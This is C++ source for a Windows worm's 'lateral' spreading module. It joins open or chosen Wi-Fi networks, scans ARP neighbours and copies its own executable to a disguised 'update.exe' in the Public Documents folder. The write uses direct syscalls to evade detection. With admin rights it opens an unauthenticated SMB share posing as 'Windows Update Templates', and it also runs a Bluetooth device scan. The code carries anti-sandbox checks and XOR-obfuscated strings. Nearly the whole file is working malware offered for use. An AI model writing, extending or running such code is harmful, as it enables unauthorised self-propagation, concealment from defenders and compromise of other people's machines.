#include "WirelessSpread.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include <lm.h>
#include <bluetoothapis.h>
#include <bthsdpdef.h>
#include <thread>
#include <chrono>
#include <vector>
#include <sstream>
#include <iomanip>

#include "../evasion/AntiSandbox.h"
#include "../evasion/Syscalls.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../fs/FileSystem.h"

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "bthprops.lib")

// NT definitions for syscalls
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

#define OBJ_CASE_INSENSITIVE 0x00000040L
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_NON_DIRECTORY_FILE 0x00000040

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}

namespace lateral {

namespace {
    using utils::ws2s;

    bool IsUserAdmin() {
        BOOL bIsAdmin = FALSE;
        PSID AdministratorsGroup = NULL;
        SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
            CheckTokenMembership(NULL, AdministratorsGroup, &bIsAdmin);
            FreeSid(AdministratorsGroup);
        }
        return bIsAdmin == TRUE;
    }

    std::wstring GetSelfPathW() {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        return std::wstring(path);
    }

    // Syscall-based file write for evasion
    bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
        auto& resolver = evasion::SyscallResolver::GetInstance();
        DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
        DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
        DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

        if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) {
            return false;
        }

        UNICODE_STRING uPath;
        uPath.Buffer = (PWSTR)ntPath.c_str();
        uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
        uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hFile = NULL;
        IO_STATUS_BLOCK ioStatus;

        NTSTATUS status = InternalDoSyscall(ntCreateFileSsn,
            &hFile,
            (PVOID)(FILE_GENERIC_WRITE | SYNCHRONIZE),
            &objAttr,
            &ioStatus,
            NULL,
            (PVOID)FILE_ATTRIBUTE_NORMAL,
            0,
            (PVOID)FILE_OVERWRITE_IF,
            (PVOID)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
            NULL,
            0);

        if (!NT_SUCCESS(status)) return false;

        status = InternalDoSyscall(ntWriteFileSsn,
            hFile,
            NULL,
            NULL,
            NULL,
            &ioStatus,
            (PVOID)data.data(),
            (PVOID)(ULONG)data.size(),
            NULL,
            NULL,
            NULL,
            NULL);

        InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        return NT_SUCCESS(status);
    }

    std::wstring GenerateOpenProfileXml(const std::wstring& ssid) {
        // Using xor_wstr for obfuscation of the XML tags
        // Pre-obfuscated segments (XOR with 0x5A)
        // "<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>"
        std::wstring part1 = utils::xor_wstr(L"\x66\x65\x22\x37\x36\x7a\x2c\x3f\x28\x29\x33\x35\x34\x67\x78\x6b\x74\x6a\x78\x65\x64\x66\x0d\x16\x1b\x14\x0a\x28\x35\x3c\x33\x36\x3f\x7a\x22\x37\x36\x34\x29\x67\x78\x32\x2e\x2e\x2a\x60\x75\x75\x2d\x2d\x2d\x74\x37\x33\x39\x28\x35\x29\x35\x3c\x2e\x74\x39\x35\x37\x75\x34\x3f\x2e\x2d\x35\x28\x31\x33\x34\x3d\x75\x0d\x16\x1b\x14\x75\x2a\x28\x35\x3c\x33\x36\x3f\x75\x2c\x6b\x78\x64\x66\x34\x3b\x37\x3f\x64", 99);
        // "</name><SSIDConfig><SSID><name>"
        std::wstring part2 = utils::xor_wstr(L"\x66\x75\x34\x3b\x37\x3f\x64\x66\x09\x09\x13\x1e\x19\x35\x34\x3c\x33\x3d\x64\x66\x09\x09\x13\x1e\x64\x66\x34\x3b\x37\x3f\x64", 31);
        // "</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>auto</connectionMode><MSM><security><authEncryption><authentication>open</authentication><encryption>none</encryption><useOneX>false</useOneX></authEncryption></security></MSM></WLANProfile>"
        std::wstring part3 = utils::xor_wstr(L"\x66\x75\x34\x3b\x37\x3f\x64\x66\x75\x09\x09\x13\x1e\x64\x66\x75\x09\x09\x13\x1e\x19\x35\x34\x3c\x33\x3d\x64\x66\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x0e\x23\x2a\x3f\x64\x1f\x09\x09\x66\x75\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x0e\x23\x2a\x3f\x64\x66\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x17\x35\x3e\x3f\x64\x3b\x2f\x2e\x35\x66\x75\x39\x35\x34\x34\x3f\x39\x2e\x33\x35\x34\x17\x35\x3e\x3f\x64\x66\x17\x09\x17\x64\x66\x29\x3f\x39\x2f\x28\x33\x2e\x23\x64\x66\x3b\x2f\x2e\x32\x1f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x3b\x2f\x2e\x32\x3f\x34\x2e\x33\x39\x3b\x2e\x33\x35\x34\x64\x35\x2a\x3f\x34\x66\x75\x3b\x2f\x2e\x32\x3f\x34\x2e\x33\x39\x3b\x2e\x33\x35\x34\x64\x66\x3f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x34\x35\x34\x3f\x66\x75\x3f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x2f\x29\x3f\x15\x34\x3f\x02\x64\x3c\x3b\x36\x29\x3f\x66\x75\x2f\x29\x3f\x15\x34\x3f\x02\x64\x66\x75\x3b\x2f\x2e\x32\x1f\x34\x39\x28\x23\x2a\x2e\x33\x35\x34\x64\x66\x75\x29\x3f\x39\x2f\x28\x33\x2e\x23\x64\x66\x75\x17\x09\x17\x64\x66\x75\x0d\x16\x1b\x14\x0a\x28\x35\x3c\x33\x36\x3f\x64", 243);

        return part1 + ssid + part2 + ssid + part3;
    }

    std::vector<std::string> GetArpTable() {
        std::vector<std::string> ips;
        ULONG size = 0;
        GetIpNetTable(NULL, &size, FALSE);
        std::vector<BYTE> buffer(size);
        PMIB_IPNETTABLE pTable = (PMIB_IPNETTABLE)buffer.data();
        if (GetIpNetTable(pTable, &size, FALSE) == NO_ERROR) {
            for (DWORD i = 0; i < pTable->dwNumEntries; i++) {
                struct in_addr addr;
                addr.s_addr = pTable->table[i].dwAddr;
                char* ip = inet_ntoa(addr);
                if (ip) ips.push_back(ip);
            }
        }
        return ips;
    }
}

std::string SpreadWifi(const std::string& targetSsid = "") {
    if (evasion::IsLikelySandbox()) return "ERROR: Sandbox detected";

    HANDLE hClient = NULL;
    DWORD dwVersion = 2;
    if (WlanOpenHandle(dwVersion, NULL, &dwVersion, &hClient) != ERROR_SUCCESS) return "ERROR: WlanOpenHandle failed";

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hClient, NULL, &pIfList) != ERROR_SUCCESS) {
        WlanCloseHandle(hClient, NULL);
        return "ERROR: WlanEnumInterfaces failed";
    }

    std::string result = "WIFI_SPREAD: ";
    bool connected = false;

    // Jitter
    std::this_thread::sleep_for(std::chrono::milliseconds(1000 + (rand() % 2000)));

    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        GUID interfaceGuid = pIfList->InterfaceInfo[i].InterfaceGuid;
        PWLAN_AVAILABLE_NETWORK_LIST pNetList = NULL;
        if (WlanGetAvailableNetworkList(hClient, &interfaceGuid, 0, NULL, &pNetList) == ERROR_SUCCESS) {
            for (DWORD j = 0; j < pNetList->dwNumberOfItems; j++) {
                WLAN_AVAILABLE_NETWORK& net = pNetList->Network[j];
                std::string ssid((char*)net.dot11Ssid.ucSSID, net.dot11Ssid.uSSIDLength);

                bool shouldConnect = false;
                if (!targetSsid.empty()) {
                    if (ssid == targetSsid) shouldConnect = true;
                } else if (!net.bSecurityEnabled) {
                    shouldConnect = true;
                }

                if (shouldConnect) {
                    WLAN_CONNECTION_PARAMETERS connParams = {};
                    connParams.wlanConnectionMode = wlan_connection_mode_temporary_profile;
                    connParams.strProfile = NULL;
                    connParams.pDot11Ssid = &net.dot11Ssid;
                    connParams.dot11BssType = net.dot11BssType;
                    connParams.dwFlags = 0;

                    DWORD dwRet = WlanConnect(hClient, &interfaceGuid, &connParams, NULL);
                    if (dwRet != ERROR_SUCCESS) {
                        // Fallback: XML Profile
                        std::wstring wssid(ssid.begin(), ssid.end());
                        std::wstring xml = GenerateOpenProfileXml(wssid);
                        DWORD dwReason = 0;
                        if (WlanSetProfile(hClient, &interfaceGuid, 0, xml.c_str(), NULL, TRUE, NULL, &dwReason) == ERROR_SUCCESS) {
                            connParams.wlanConnectionMode = wlan_connection_mode_profile;
                            connParams.strProfile = wssid.c_str();
                            dwRet = WlanConnect(hClient, &interfaceGuid, &connParams, NULL);
                        }
                    }

                    if (dwRet == ERROR_SUCCESS) {
                        result += "Connected to " + ssid + ". ";
                        connected = true;
                        break;
                    }
                }
            }
            WlanFreeMemory(pNetList);
        }
        if (connected) break;
    }

    if (connected) {
        // Targeted discovery: ARP scan
        std::vector<std::string> neighbors = GetArpTable();
        result += "Discovered " + std::to_string(neighbors.size()) + " hosts via ARP. ";

        // Payload push
        std::wstring selfPath = GetSelfPathW();
        std::vector<BYTE> binary = fs::ReadFileBinary(ws2s(selfPath));

        // Stealthy path: C:\Users\Public\Documents\update.exe
        // NT path: \??\C:\Users\Public\Documents\update.exe
        // C:\Users\Public\Documents is more likely to exist by default.
        std::wstring targetPath = L"\\??\\C:\\Users\\Public\\Documents";

        std::wstring fullTargetPath = targetPath + L"\\update.exe";

        if (SyscallWriteFile(fullTargetPath, binary)) {
            std::wstring displayPath = fullTargetPath;
            if (displayPath.find(L"\\??\\") == 0) displayPath = displayPath.substr(4);
            result += "Payload dropped to " + ws2s(displayPath) + ". ";

            if (IsUserAdmin()) {
                SHARE_INFO_2 si;
                std::wstring shareName = utils::xor_wstr(L"\x0e\x3f\x37\x2a\x36\x3b\x2e\x3f\x29\x0f\x2a\x3e\x3b\x2e\x3f", 15); // "TemplatesUpdate"
                std::wstring shareRemark = utils::xor_wstr(L"\x0d\x33\x34\x3e\x35\x2d\x29\x7a\x0f\x2a\x3e\x3b\x2e\x3f\x7a\x0e\x3f\x37\x2a\x36\x3b\x2e\x3f\x29", 24); // "Windows Update Templates"
                si.shi2_netname = (LMSTR)shareName.c_str();
                si.shi2_type = STYPE_DISKTREE;
                si.shi2_remark = (LMSTR)shareRemark.c_str();
                si.shi2_permissions = ACCESS_ALL;
                si.shi2_max_uses = (DWORD)-1;
                si.shi2_current_uses = 0;
                si.shi2_path = (LMSTR)L"C:\\Users\\Public\\Documents";
                si.shi2_passwd = NULL;

                if (NetShareAdd(NULL, 2, (LPBYTE)&si, NULL) == NERR_Success) {
                    result += "SMB Share 'TemplatesUpdate' created. ";
                }
            }
        } else {
            result += "Payload drop failed. ";
        }
    } else {
        result += "No open networks found or connection failed.";
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hClient, NULL);
    return result;
}

std::string SpreadBt() {
    // Bluetooth discovery stub
    BLUETOOTH_DEVICE_SEARCH_PARAMS searchParams = { sizeof(BLUETOOTH_DEVICE_SEARCH_PARAMS) };
    searchParams.fReturnAuthenticated = TRUE;
    searchParams.fReturnRemembered = TRUE;
    searchParams.fReturnUnknown = TRUE;
    searchParams.fReturnConnected = TRUE;
    searchParams.fIssueInquiry = TRUE;
    searchParams.cTimeoutMultiplier = 2;
    searchParams.hRadio = NULL;

    BLUETOOTH_DEVICE_INFO deviceInfo = { sizeof(BLUETOOTH_DEVICE_INFO) };
    HBLUETOOTH_DEVICE_FIND hFind = BluetoothFindFirstDevice(&searchParams, &deviceInfo);

    std::string report = "BT_SCAN_RESULTS:\n";
    int count = 0;
    if (hFind != NULL) {
        do {
            std::wstring name(deviceInfo.szName);
            report += "Device: " + ws2s(name) + " (";
            for (int i = 0; i < 6; i++) {
                std::stringstream ss;
                ss << std::hex << std::setw(2) << std::setfill('0') << (int)deviceInfo.Address.rgBytes[5-i];
                report += ss.str() + (i < 5 ? ":" : "");
            }
            report += ")\n";
            count++;
        } while (BluetoothFindNextDevice(hFind, &deviceInfo));
        BluetoothFindDeviceClose(hFind);
    }

    if (count == 0) report += "No Bluetooth devices found.";
    else report += "Total devices: " + std::to_string(count);

    return report;
}

std::string SpreadWireless(const std::string& cmd) {
    if (cmd == "bt") return SpreadBt();

    std::string targetSsid = "";
    if (cmd.find("wifi") == 0) {
        if (cmd.length() > 5) targetSsid = cmd.substr(5);
        return SpreadWifi(targetSsid);
    }

    return "ERROR: Invalid mode. Use 'wifi [ssid]' or 'bt'.";
}

} // namespace lateral
